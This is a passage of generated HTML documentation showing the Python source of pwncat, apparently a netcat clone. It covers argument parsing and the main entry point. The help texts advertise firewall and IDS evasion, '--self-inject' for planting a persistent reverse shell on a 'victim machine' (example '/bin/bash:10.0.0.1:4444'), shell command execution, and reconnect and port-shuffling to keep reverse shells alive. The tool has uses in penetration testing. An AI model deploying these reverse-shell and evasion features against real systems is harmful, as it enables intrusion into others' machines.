    mcomma = re.search(r&#34;^[0-9]+(,([0-9]+))*$&#34;, value)
    mrange = re.search(r&#34;^[0-9]+\-[0-9]+$&#34;, value)

    if mcomma is None:
        if mrange is None:
            raise argparse.ArgumentTypeError(&#34;%s is not a valid port specifier&#34; % value)

    if mcomma:
        ports = [int(port) for port in mcomma.group(0).split(&#34;,&#34;)]
        for port in ports:
            _args_check_port(str(port))
        return ports

    if mrange:
        ranges = [int(r) for r in mrange.group(0).split(&#34;-&#34;)]
        if ranges[0] &gt;= (ranges[1] + 1):
            raise argparse.ArgumentTypeError(
                &#34;Left side of range must be smaller or equal than right side.&#34;
            )
        ports = []
        for port in range(ranges[0], ranges[1] + 1):
            _args_check_port(str(port))
            ports.append(port)
        return ports

    return []


def _args_check_mutually_exclusive(parser, args):
    # type: (argparse.ArgumentParser, argparse.Namespace) -&gt; None
    &#34;&#34;&#34;Check mutually exclusive arguments.&#34;&#34;&#34;
    # This is connect mode
    connect_mode = not args.listen and not args.zero and not args.local and not args.remote

    # [MODE] --listen
    if args.listen and (args.zero or args.local or args.remote):
        parser.print_usage()
        print(
            &#34;%s: error: -l/--listen mutually excl. with -z/-zero, -L or -R&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE] --zero
    if args.zero and (args.listen or args.local or args.remote):
        parser.print_usage()
        print(
            &#34;%s: error: -z/--zero mutually excl. with -l/--listen, -L or -R&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE --local
    if args.local and (args.listen or args.zero or args.remote):
        parser.print_usage()
        print(
            &#34;%s: error: -L/--local mutually excl. with -l/--listen, -z/--zero or -R&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE --remote
    if args.remote and (args.listen or args.zero or args.local):
        parser.print_usage()
        print(
            &#34;%s: error: -R/--remote mutually excl. with -l/--listen, -z/--zero or -L&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODULE] --exec
    if args.cmd and (args.local or args.remote or args.zero):
        parser.print_usage()
        print(
            &#34;%s: error: -e/--exec mutually excl. with -L, -R or -z/--zero&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [OPTIONS] --udp
    if args.udp and args.zero:
        parser.print_usage()
        print(
            &#34;%s: error: -u/--udp mutually excl. with -z/--zero&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --http
    if args.http and (args.https or args.udp or args.zero):
        parser.print_usage()
        print(
            &#34;%s: error: --http mutually excl. with --https, -u/--udp or -z/--zero&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --https
    if args.https and (args.http or args.udp or args.zero):
        parser.print_usage()
        print(
            &#34;%s: error: --https mutually excl. with --http, -z/--udp or -z/--zero&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --keep-open
    if args.keep_open and (args.udp):
        parser.print_usage()
        print(
            &#34;%s: error: --keep-open mutually excl. with -u/--udp&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)
    if args.keep_open and not args.listen:
        parser.print_usage()
        print(
            &#34;%s: error: --keep-open only works with -l/--listen&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --wait
    if args.wait is not False and args.udp:
        parser.print_usage()
        print(
            &#34;%s: error: -w/--wait mutually excl. with -u/--udp&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)
    if args.wait is not False and not connect_mode:
        parser.print_usage()
        print(
            &#34;%s: error: -w/--wait only works with connect mode&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --ping-init
    if args.ping_init is not False and (args.listen or args.local):
        parser.print_usage()
        print(
            &#34;%s: error: --ping-init mutually excl. with -l/--listen or -L/--local&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)
    if args.ping_init is not False and not args.udp:
        parser.print_usage()
        print(
            &#34;%s: error: --ping-init only works with -u/--udp&#34; % (APPNAME), file=sys.stderr,
        )
        sys.exit(1)


# -------------------------------------------------------------------------------------------------
# [9/10 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser
# -------------------------------------------------------------------------------------------------
def get_args():
    # type: () -&gt; argparse.Namespace
    &#34;&#34;&#34;Retrieve command line arguments.&#34;&#34;&#34;
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage=&#34;&#34;&#34;%(prog)s [-Cnuv] [-e cmd] hostname port
       %(prog)s [-Cnuv] [-e cmd] -l [hostname] port
       %(prog)s [-Cnuv] -z hostname port
       %(prog)s [-Cnuv] -L addr:port hostname port
       %(prog)s [-Cnuv] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       &#34;&#34;&#34;
        % ({&#34;prog&#34;: APPNAME}),
        description=&#34;&#34;&#34;
Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See advanced options for how to automatically
reconnect.&#34;&#34;&#34;,
    )

    positional = parser.add_argument_group(&#34;positional arguments&#34;)
    mode = parser.add_argument_group(&#34;mode arguments&#34;)
    optional = parser.add_argument_group(&#34;optional arguments&#34;)
    cnc = parser.add_argument_group(&#34;command &amp; control arguments&#34;)
    advanced = parser.add_argument_group(&#34;advanced arguments&#34;)
    misc = parser.add_argument_group(&#34;misc arguments&#34;)

    positional.add_argument(
        &#34;hostname&#34;, nargs=&#34;?&#34;, type=str, help=&#34;Address to listen, forward or connect to&#34;
    )
    positional.add_argument(
        &#34;port&#34;, type=_args_check_port, help=&#34;Port to listen, forward or connect to&#34;
    )

    mode.add_argument(
        &#34;-l&#34;,
        &#34;--listen&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;[Listen mode]:
Start a server and listen for incoming connections.
If using TCP and a connected client disconnects or the
connection is interrupted otherwise, the server will
quit. See -k/--keep-open to change this behaviour.

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-z&#34;,
        &#34;--zero&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;[Zero-I/0 mode]:
Connect to a remote endpoint and report status only.
Used for port scanning.

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-L&#34;,
        &#34;--local&#34;,
        metavar=&#34;addr:port&#34;,
        default=False,
        type=_args_check_forwards,
        help=&#34;&#34;&#34;[Local forward mode]:
This mode will start a server and a client internally.
The internal server will listen locally on specified
hostname/port (positional arguments). Same as with -l.
The server will then forward traffic to the internal
client which connects to another server specified by
address given via -L/--local addr:port.
(I.e.: proxies a remote service to a local address)

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-R&#34;,
        &#34;--remote&#34;,
        metavar=&#34;addr:port&#34;,
        default=False,
        type=_args_check_forwards,
        help=&#34;&#34;&#34;[Remote forward mode]:
This mode will start two clients internally. One is
connecting to the target and one is connecting to
another pwncat/netcat server you have started some-
where. Once connected, it will then proxy traffic
between you and the target.
This mode should be applied on machines that block
incoming traffic and only allow outbound.
The connection to your listening server is given by
-R/--remote addr:port and the connection to the
target machine via the positional arguments.
&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-6&#34;, dest=&#34;ipv6&#34;, action=&#34;store_true&#34;, default=False, help=&#34;Use IPv6 instead of IPv4.&#34;,
    )
    optional.add_argument(
        &#34;-e&#34;,
        &#34;--exec&#34;,
        metavar=&#34;cmd&#34;,
        dest=&#34;cmd&#34;,
        default=False,
        type=str,
        help=&#34;Execute shell command. Only for connect or listen mode.&#34;,
    )
    # TODO: add --crlf-i and --crlf-o to only do this on input or output and have
    # --crlf to always do it on input and output!
    optional.add_argument(
        &#34;-C&#34;,
        &#34;--crlf&#34;,
        type=_args_check_lf,
        metavar=&#34;lf&#34;,
        default=None,
        help=&#34;&#34;&#34;Specify, &#39;lf&#39;, &#39;crlf&#39; or &#39;cr&#39; to always force replacing
line endings for input and outout accordingly. Specify
&#39;no&#39; to completely remove any line feeds. By default
it will not replace anything and takes what is entered
(usually CRLF on Windows, LF on Linux and some times
CR on MacOS).&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-n&#34;, &#34;--nodns&#34;, action=&#34;store_true&#34;, default=False, help=&#34;Do not resolve DNS.&#34;,
    )
    optional.add_argument(
        &#34;-u&#34;,
        &#34;--udp&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;Use UDP for the connection instead of TCP.&#34;,
    )
    optional.add_argument(
        &#34;-T&#34;,
        &#34;--tos&#34;,
        metavar=&#34;str&#34;,
        default=None,
        type=_args_check_tos,
        help=&#34;&#34;&#34;Specifies IP Type of Service (ToS) for the connection.
Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
&#39;reliability&#39;, &#39;throughput&#39; or &#39;lowdelay&#39;.
&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-v&#34;,
        &#34;--verbose&#34;,
        action=&#34;count&#34;,
        default=0,
        help=&#34;&#34;&#34;Be verbose and print info to stderr. Use -v, -vv, -vvv
or -vvvv for more verbosity. The server performance will
decrease drastically if you use more than three times.&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;--info&#34;,
        metavar=&#34;type&#34;,
        default=&#34;&#34;,
        type=_args_check_info,
        help=&#34;&#34;&#34;Show additional info about sockets, ip4/6 or tcp opts
applied to the current socket connection. Valid
parameter are &#39;sock&#39;, &#39;ipv4&#39;, &#39;ipv6&#39;, &#39;tcp&#39; or &#39;all&#39;.
Note, you must at least be in INFO verbose mode in order
to see them (-vv).&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-c&#34;,
        &#34;--color&#34;,
        metavar=&#34;str&#34;,
        default=&#34;auto&#34;,
        type=_args_check_color,
        help=&#34;&#34;&#34;Colored log output. Specify &#39;always&#39;, &#39;never&#39; or &#39;auto&#39;.
In &#39;auto&#39; mode, color is displayed as long as the output
goes to a terminal. If it is piped into a file, color
will automatically be disabled. This mode also disables
color on Windows by default. (default: auto)
&#34;&#34;&#34;,
    )

    cnc.add_argument(
        &#34;--self-inject&#34;,
        metavar=&#34;cmd:host:port&#34;,
        default=None,
        type=_args_check_upload_myself,
        help=&#34;&#34;&#34;Listen mode (TCP only):
If you are about to inject a reverse shell onto the
victim machine (via php, bash, nc, ncat or similar),
start your listening server with this argument.
This will then (as soon as the reverse shell connects)
automatically deploy and background-run an unbreakable
pwncat reverse shell onto the victim machine which then
also connects back to you with specified arguments.
Example: &#39;--self-inject /bin/bash:10.0.0.1:4444&#39;
Note: this is currently an experimental feature and does
not work on Windows remote hosts yet.
&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--script-send&#34;,
        metavar=&#34;file&#34;,
        default=None,
        type=_args_check_script,
        help=&#34;&#34;&#34;All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed before
sending data to a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be &#39;transform&#39;
    # NOTE: the function param name must be &#39;data&#39;
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat&#39;s function or classes, as the
file will be called with exec().

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--script-recv&#34;,
        metavar=&#34;file&#34;,
        default=None,
        type=_args_check_script,
        help=&#34;&#34;&#34;All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed after
receiving data from a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be &#39;transform&#39;
    # NOTE: the function param name must be &#39;data&#39;
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat&#39;s function or classes, as the
file will be called with exec().

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--http&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect / Listen / Local forward mode (TCP only):
Hide traffic in http packets to fool Firewalls/IDS/IPS.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--https&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect / Listen / Local forward mode (TCP only):
Hide traffic in https packets to fool Firewalls/IDS/IPS.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;-k&#34;,
        &#34;--keep-open&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Listen mode (TCP only):
Re-accept new clients in listen mode after a client has
disconnected or the connection is unterrupted otherwise.
(default: server will quit after connection is gone)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind&#34;,
        metavar=&#34;x&#34;,
        nargs=&#34;?&#34;,
        default=0,
        type=int,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
If the server is unable to bind, it will re-initialize
itself x many times before giving up. Omit the
quantifier to rebind endlessly or specify a positive
integer for how many times to rebind before giving up.
See --rebind-robin for an interesting use-case.
(default: fail after first unsuccessful try).

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind-wait&#34;,
        metavar=&#34;s&#34;,
        default=1.0,
        type=float,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
Wait x seconds between re-initialization. (default: 1)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--rebind-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Listen mode (TCP and UDP):
If the server is unable to initialize (e.g: cannot bind
and --rebind is specified, it it will shuffle ports in
round-robin mode to bind to. Use comma separated string
such as &#39;80,81,82&#39; or a range of ports &#39;80-100&#39;.
Set --rebind to at least the number of ports to probe +1
This option requires --rebind to be specified.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn&#34;,
        metavar=&#34;x&#34;,
        nargs=&#34;?&#34;,
        default=0,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
If the remote server is not reachable or the connection
is interrupted, the client will connect again x many
times before giving up. Omit the quantifier to retry
endlessly or specify a positive integer for how many
times to retry before giving up.
(default: quit if the remote is not available or the
connection was interrupted)
This might be handy for stable TCP reverse shells ;-)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn-wait&#34;,
        metavar=&#34;s&#34;,
        default=1.0,
        type=float,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
Wait x seconds between re-connects. (default: 1)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--reconn-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
If the remote server is not reachable or the connection
is interrupted and --reconn is specified, the client
will shuffle ports in round-robin mode to connect to.
Use comma separated string such as &#39;80,81,82&#39; or a range
of ports &#39;80-100&#39;.
Set --reconn to at least the number of ports to probe +1
This helps reverse shell to evade intrusiona prevention
systems that will cut your connection and block the
outbound port.
This is also useful in Connect or Zero-I/O mode to
figure out what outbound ports are allowed.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;-w&#34;,
        &#34;--wait&#34;,
        metavar=&#34;s&#34;,
        default=False,
        type=int,
        help=&#34;&#34;&#34;Connect mode (TCP only):
If a connection and stdin are idle for more than s sec,
then the connection is silently closed and the client
will exit. (default: wait forever).
Note: if --reconn is specified, the connection will be
re-opened.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-init&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
UDP is a stateless protocol unlike TCP, so no hand-
shake communication takes place and the client just
sends data to a server without being &#34;accepted&#34; by
the server first.
This means a server waiting for an UDP client to
connect to, is unable to send any data to the client,
before the client hasn&#39;t send data first. The server
simply doesn&#39;t know the IP address before an initial
connect.
The --ping-init option instructs the client to send one
single initial ping packet to the server, so that it is
able to talk to the client.
This is the only way to make a UDP reverse shell work.
See --ping-word for what char/string to send as initial
ping packet (default: &#39;\\0&#39;)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-intvl&#34;,
        metavar=&#34;s&#34;,
        default=False,
        type=int,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Instruct the client to send ping intervalls every s sec.
This allows you to restart your UDP server and just wait
for the client to report back in. This might be handy
for stable UDP reverse shells ;-)
See --ping-word for what char/string to send as initial
ping packet (default: &#39;\\0&#39;)

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-word&#34;,
        metavar=&#34;str&#34;,
        default=&#34;\0&#34;,
        type=str,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Change the default character &#39;\\0&#39; to use for upd ping.
Single character or strings are supported.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--ping-robin&#34;,
        metavar=&#34;port&#34;,
        default=[],
        type=_args_check_robin_ports,
        help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
Instruct the client to shuffle the specified ports in
round-robin mode for a remote server to ping.
This might be handy to scan outbound allowed ports.
Use --ping-intvl 0 to be faster.

&#34;&#34;&#34;,
    )
    advanced.add_argument(
        &#34;--safe-word&#34;,
        metavar=&#34;str&#34;,
        default=False,
        type=str,
        help=&#34;&#34;&#34;All modes:
If %(prog)s is started with this argument, it will shut
down as soon as it receives the specified string. The
--keep-open (server) or --reconn (client) options will
be ignored and it won&#39;t listen again or reconnect to you.
Use a very unique string to not have it shut down
accidentally by other input.
&#34;&#34;&#34;
        % ({&#34;prog&#34;: APPNAME}),
    )
    misc.add_argument(&#34;-h&#34;, &#34;--help&#34;, action=&#34;help&#34;, help=&#34;Show this help message and exit&#34;)
    misc.add_argument(
        &#34;-V&#34;,
        &#34;--version&#34;,
        action=&#34;version&#34;,
        version=get_version(),
        help=&#34;Show version information and exit&#34;,
    )

    # Retrieve arguments
    args = parser.parse_args()

    # Check mutually exclive arguments
    _args_check_mutually_exclusive(parser, args)

    # Connect mode and Zero-I/O mode require hostname and port to be set
    connect_mode = not (args.listen or args.zero or args.local or args.remote)
    if (connect_mode or args.zero) and not args.hostname:
        parser.print_usage()
        print(
            &#34;%s: error: the following arguments are required: hostname&#34; % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Deny unimplemented modes
    if args.http or args.https or args.rebind or args.wait or args.ping_init or args.safe_word:
        print(&#34;Unimplemented options&#34;, file=sys.stderr)
        sys.exit(1)

    return args


# #################################################################################################
# #################################################################################################
# ###
# ###   10 / 10   M A I N   E N T R Y P O I N T
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [9/9 MAIN ENTRYPOINT]: (1/2) main
# -------------------------------------------------------------------------------------------------
def main():
    # type: () -&gt; None
    &#34;&#34;&#34;Run the program.&#34;&#34;&#34;
    args = get_args()
    host = args.hostname
    ports = [args.port]

    reconn = -1 if args.reconn is None else args.reconn
    rebind = -1 if args.rebind is None else args.rebind

    # Set pwncat options
    sock_opts = DsIONetworkSock(
        RECV_BUFSIZE,
        LISTEN_BACKLOG,
        TIMEOUT_RECV_SOCKET,
        TIMEOUT_RECV_SOCKET_RETRY,
        args.nodns,
        args.ipv6,
        args.udp,
        args.tos,
        args.info,
    )
    srv_opts = DsIONetworkSrv(args.keep_open, rebind, args.rebind_wait, args.rebind_robin)
    cli_opts = DsIONetworkCli(reconn, args.reconn_wait, args.reconn_robin)
    # TODO:
    # &#34;wait&#34;: args.wait,
    # &#34;ping_init&#34;: args.ping_init,
    # &#34;ping_intvl&#34;: args.ping_intvl,
    # &#34;ping_word&#34;: args.ping_word,
    # &#34;ping_robing&#34;: args.ping_robin,
    # &#34;safe_word&#34;: args.safe_word,

    # Map pwncat verbosity to Python&#39;s Logger loglevel
    logmap = {
        0: logging.ERROR,
        1: logging.WARNING,
        2: logging.INFO,
        3: logging.DEBUG,
    }
    loglevel = logmap.get(args.verbose, TraceLogger.LEVEL_NUM)

    # Use a colored log formatter
    formatter = ColoredLogFormatter(args.color, loglevel)
    handler = logging.StreamHandler()
    handler.setLevel(loglevel)
    handler.setFormatter(formatter)

    # Use a custom logger with TRACE level
    logging.setLoggerClass(TraceLogger)
    logger = logging.getLogger(__name__)
    logger.setLevel(loglevel)
    logger.addHandler(handler)

    # Initialize encoder
    enc = StringEncoder()

    # Initialize StopSignal
    ssig = StopSignal()

    # Initialize transformers
    transformers = []
    if args.crlf is not None:
        transformers.append(TransformLinefeed(DsTransformLinefeed(args.crlf)))

    # Initialize scripting engine transformers
    code_send = None
    code_recv = None
    if args.script_send is not None:
        code_send = compile(args.script_send, &#34;&lt;script-send&gt;&#34;, &#34;exec&#34;)
    if args.script_recv is not None:
        code_recv = compile(args.script_recv, &#34;&lt;script-recv&gt;&#34;, &#34;exec&#34;)

    # Use command modulde
    if args.cmd:
        mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
    # Use output module
    else:
        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN))

    # Run local port-forward
    # -&gt; listen locally and forward traffic to remote (connect)
    if args.local:
        # TODO: Make the listen address optional!
        srv_opts.keep_open = True
        lhost = args.local.split(&#34;:&#34;)[0]
        lport = int(args.local.split(&#34;:&#34;)[1])
        # Create listen and client instances
        net_srv = IONetwork(ssig, enc, lhost, [lport], &#34;server&#34;, srv_opts, cli_opts, sock_opts)
        net_cli = IONetwork(ssig, enc, host, ports, &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(PSEStore(ssig, [net_srv, net_cli]))
        run.add_action(
            &#34;TRANSMIT&#34;,
            DsRunnerAction(
                net_srv.producer,  # (receive) USER sends data to PC-SERVER
                net_cli.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                None,
            ),
        )
        run.add_action(
            &#34;RECEIVE&#34;,
            DsRunnerAction(
                net_cli.producer,  # (receive) Data comes back from TARGET to PC-CLIENT
                net_srv.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                None,
            ),
        )
        run.run()
    # Run remote port-forward
    # -&gt; connect to client, connect to target and proxy traffic in between.
    if args.remote:
        # TODO: Make the listen address optional!
        cli_opts.reconn = -1
        cli_opts.reconn_wait = 0.1
        lhost = args.remote.split(&#34;:&#34;)[0]
        lport = int(args.remote.split(&#34;:&#34;)[1])
        # Create local and remote client
        net_cli_l = IONetwork(ssig, enc, lhost, [lport], &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        net_cli_r = IONetwork(ssig, enc, host, ports, &#34;client&#34;, srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(PSEStore(ssig, [net_cli_l, net_cli_r]))
        run.add_action(
            &#34;TRANSMIT&#34;,
            DsRunnerAction(
                net_cli_l.producer,  # (receive) USER sends data to PC-SERVER
                net_cli_r.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [],
                transformers,
                None,
            ),
        )
        run.add_action(
            &#34;RECEIVE&#34;,
            DsRunnerAction(
                net_cli_r.producer,  # (receive) Data comes back from TARGET to PC-CLIENT
                net_cli_l.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [],
                transformers,
                None,
            ),
        )
        run.run()
    # Run server
    if args.listen:
        net = IONetwork(ssig, enc, host, ports, &#34;server&#34;, srv_opts, cli_opts, sock_opts)
        # Run blocking auto-deploy.
        # This will hand over to normal listening server on success or failure
        if args.self_inject:
            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
        run = Runner(PSEStore(ssig, [net]))
        run.add_action(
            &#34;RECV&#34;,
            DsRunnerAction(
                net.producer,  # receive data
                mod.consumer,
                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
                transformers,
                code_recv,
            ),
        )
        run.add_action(
            &#34;STDIN&#34;,
            DsRunnerAction(
                mod.producer,
                net.consumer,  # send data
                [mod.interrupt],  # Externally stop the produer itself
                transformers,
                code_send,
            ),
        )
        run.run()

    # Run client
    else:
        net = IONetwork(
            ssig, enc, host, ports + args.reconn_robin, &#34;client&#34;, srv_opts, cli_opts, sock_opts
        )
        run = Runner(PSEStore(ssig, [net]))
        run.add_action(
            &#34;RECV&#34;,
            DsRunnerAction(
                net.producer,  # receive data
                mod.consumer,
                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
                transformers,
                code_recv,
            ),
        )
        run.add_action(
            &#34;STDIN&#34;,
            DsRunnerAction(
                mod.producer,
                net.consumer,  # send data
                [net.interrupt, mod.interrupt],  # Externally stop the produer itself
                transformers,
                code_send,
            ),
        )
        if type(args.ping_intvl) is int and args.ping_intvl &gt; 0:
            run.add_timer(
                &#34;PING&#34;,
                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (args.ping_word)),  # send data
            )
        run.run()


# -------------------------------------------------------------------------------------------------
# [9/9 MAIN ENTRYPOINT]: (2/2) start
# -------------------------------------------------------------------------------------------------
if __name__ == &#34;__main__&#34;:
    # Catch Ctrl+c and exit without error message
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(1)</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="pwncat.get_args"><code class="name flex">
<span>def <span class="ident">get_args</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"><p>Retrieve command line arguments.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_args():
    # type: () -&gt; argparse.Namespace
    &#34;&#34;&#34;Retrieve command line arguments.&#34;&#34;&#34;
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage=&#34;&#34;&#34;%(prog)s [-Cnuv] [-e cmd] hostname port
       %(prog)s [-Cnuv] [-e cmd] -l [hostname] port
       %(prog)s [-Cnuv] -z hostname port
       %(prog)s [-Cnuv] -L addr:port hostname port
       %(prog)s [-Cnuv] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       &#34;&#34;&#34;
        % ({&#34;prog&#34;: APPNAME}),
        description=&#34;&#34;&#34;
Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See advanced options for how to automatically
reconnect.&#34;&#34;&#34;,
    )

    positional = parser.add_argument_group(&#34;positional arguments&#34;)
    mode = parser.add_argument_group(&#34;mode arguments&#34;)
    optional = parser.add_argument_group(&#34;optional arguments&#34;)
    cnc = parser.add_argument_group(&#34;command &amp; control arguments&#34;)
    advanced = parser.add_argument_group(&#34;advanced arguments&#34;)
    misc = parser.add_argument_group(&#34;misc arguments&#34;)

    positional.add_argument(
        &#34;hostname&#34;, nargs=&#34;?&#34;, type=str, help=&#34;Address to listen, forward or connect to&#34;
    )
    positional.add_argument(
        &#34;port&#34;, type=_args_check_port, help=&#34;Port to listen, forward or connect to&#34;
    )

    mode.add_argument(
        &#34;-l&#34;,
        &#34;--listen&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;[Listen mode]:
Start a server and listen for incoming connections.
If using TCP and a connected client disconnects or the
connection is interrupted otherwise, the server will
quit. See -k/--keep-open to change this behaviour.

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-z&#34;,
        &#34;--zero&#34;,
        action=&#34;store_true&#34;,
        default=False,
        help=&#34;&#34;&#34;[Zero-I/0 mode]:
Connect to a remote endpoint and report status only.
Used for port scanning.

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-L&#34;,
        &#34;--local&#34;,
        metavar=&#34;addr:port&#34;,
        default=False,
        type=_args_check_forwards,
        help=&#34;&#34;&#34;[Local forward mode]:
This mode will start a server and a client internally.
The internal server will listen locally on specified
hostname/port (positional arguments). Same as with -l.
The server will then forward traffic to the internal
client which connects to another server specified by
address given via -L/--local addr:port.
(I.e.: proxies a remote service to a local address)

&#34;&#34;&#34;,
    )
    mode.add_argument(
        &#34;-R&#34;,
        &#34;--remote&#34;,
        metavar=&#34;addr:port&#34;,
        default=False,
        type=_args_check_forwards,
        help=&#34;&#34;&#34;[Remote forward mode]:
This mode will start two clients internally. One is
connecting to the target and one is connecting to
another pwncat/netcat server you have started some-
where. Once connected, it will then proxy traffic
between you and the target.
This mode should be applied on machines that block
incoming traffic and only allow outbound.
The connection to your listening server is given by
-R/--remote addr:port and the connection to the
target machine via the positional arguments.
&#34;&#34;&#34;,
    )
    optional.add_argument(
        &#34;-6&#34;, dest=&#34;ipv6&#34;, action=&#34;store_true&#34;, default=False, help=&#34;Use IPv6 instead of IPv4.&#34;,
    )
    optional.add_argument(
        &#34;-e&#34;,
        &#34;--exec&#34;,
        metavar=&#34;cmd&#34;,
        dest=&#34;cmd&#34;,
        default=False,
        type=str,
        help=&#34;Execute shell command. Only for connect or listen mode.&#34;,
    )
